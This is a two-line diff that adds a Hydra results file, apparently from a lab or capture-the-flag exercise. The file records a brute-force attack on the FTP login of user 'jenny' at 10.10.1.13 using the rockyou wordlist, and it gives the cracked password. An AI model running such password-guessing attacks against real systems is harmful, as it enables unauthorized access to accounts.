@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2022-02-21 23:31:37 on 10.10.1.13 ftp (hydra -l jenny -P /usr/share/wordlists/rockyou.txt -o hydra_scan.txt ftp://10.10.1.13)
+[21][ftp] host: 10.10.1.13   login: jenny   password: 987654321
